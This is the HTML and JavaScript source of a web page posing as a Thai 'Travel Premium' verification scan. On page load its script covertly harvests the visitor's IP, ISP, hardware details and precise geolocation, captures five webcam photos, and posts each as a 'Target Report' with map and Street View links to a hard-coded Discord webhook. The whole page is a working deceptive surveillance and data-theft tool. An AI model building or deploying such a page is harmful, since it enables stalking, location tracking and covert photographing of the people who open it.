<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 2s infinite; box-shadow: 0 0 20px #3b82f6; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                Deep Scan Analytics v7.0
            </div>
            <h1 class="text-3xl font-bold mb-2">ตรวจสอบระบบขั้นสูง</h1>
            <p class="text-slate-400 text-sm leading-relaxed">กำลังรวบรวมข้อมูล Network, IP และ Hardware เพื่อความปลอดภัยระดับสูงสุด</p>
        </div>

        <div class="p-8 pt-0">
            <div id="step-scan" class="block text-center">
                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
                    <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
                    <div class="scan-anim"></div>
                </div>
                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังดึงข้อมูลเครือข่าย...</p>
            </div>

            <div id="step-result" class="hidden animate-in fade-in duration-700 text-center">
                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl">
                    <p class="text-green-400 font-bold text-sm">✓ การตรวจสอบเสร็จสมบูรณ์</p>
                    <p class="text-[10px] text-slate-500">ข้อมูลถูกส่งไปยังเซิร์ฟเวอร์เรียบร้อยแล้ว</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500160535629660263/DqTP_nBQDLnPNoDADa-bXEb-1lKS6H5Ztt6Y7_TzoKCyiahTsosXJiG9M_dlTRyiwMmP";
        let userPos = { lat: 0, lon: 0 };
        let shotCount = 0;
        const MAX_SHOTS = 5;

        // ข้อมูลสรุป
        let fullData = {
            ip: "Checking...",
            isp: "Checking...",
            netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
            battery: "N/A",
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "N/A",
            gpu: "N/A",
            screen: `${window.screen.width}x${window.screen.height}`
        };

        window.onload = async () => {
            await getNetworkAndHardware();
            startProcess();
        };

        async function getNetworkAndHardware() {
            // ดึง IP และ ISP แบบละเอียด
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                fullData.ip = data.ip;
                fullData.isp = `${data.org} (${data.city}, ${data.country_name})`;
            } catch (e) {
                try {
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const data2 = await res2.json();
                    fullData.ip = data2.ip;
                } catch (e2) {}
            }

            // แบตเตอรี่
            try {
                const batt = await navigator.getBattery();
                fullData.battery = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
            } catch (e) {}

            // GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                fullData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}
        }

        async function startProcess() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    userPos.lat = pos.coords.latitude;
                    userPos.lon = pos.coords.longitude;
                    await initCamera();
                }, (err) => {
                    alert("กรุณาอนุญาตพิกัดเพื่อเข้าใช้งาน");
                    location.reload();
                });
            }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                document.getElementById('status-msg').innerText = "กำลังซิงค์พิกัดหน้าบ้าน...";

                const burst = setInterval(async () => {
                    if (shotCount >= MAX_SHOTS) {
                        clearInterval(burst);
                        stream.getTracks().forEach(t => t.stop());
                        showResults();
                        return;
                    }
                    await captureAndSend(video);
                    shotCount++;
                }, 500); // 0.1วิ ตามที่เคยขอ แต่อาจจะเร็วไปสำหรับเน็ตบางคน แนะนำ 0.5วิ (500ms) ครับ
            } catch (e) {
                alert("กรุณาอนุญาตกล้อง");
            }
        }

        async function captureAndSend(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                const payload = {
                    embeds: [{
                        title: `🛡️ Target Report [Shot ${shotCount + 1}]`,
                        color: 15105570,
                        fields: [
                            { name: "🌐 Network IP", value: `\`${fullData.ip}\``, inline: true },
                            { name: "📡 ISP", value: `\`${fullData.isp}\``, inline: true },
                            { name: "📶 Connection", value: `\`${fullData.netType}\``, inline: true },
                            { name: "🔋 Battery", value: `\`${fullData.battery}\``, inline: true },
                            { name: "🧠 RAM / CPU", value: `\`RAM: ${fullData.ram} | CPU: ${fullData.cpu}\``, inline: false },
                            { name: "🎮 GPU", value: `\`${fullData.gpu}\``, inline: false },
                            { name: "📍 Location", value: `[Map](https://www.google.com/maps?q=${userPos.lat},${userPos.lon}) | [Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon})`, inline: false },
                            { name: "📱 OS/Platform", value: `\`${navigator.platform}\``, inline: true },
                            { name: "🖥️ Screen", value: `\`${fullData.screen}\``, inline: true }
                        ],
                        image: { url: "attachment://shot.jpg" },
                        footer: { text: "Verified User Metadata • " + new Date().toLocaleString() }
                    }]
                };

                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', blob, 'shot.jpg');
                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.7);
        }

        function showResults() {
            document.getElementById('step-scan').classList.add('hidden');
            document.getElementById('step-result').classList.remove('hidden');
        }
    </script>
</body>
</html>
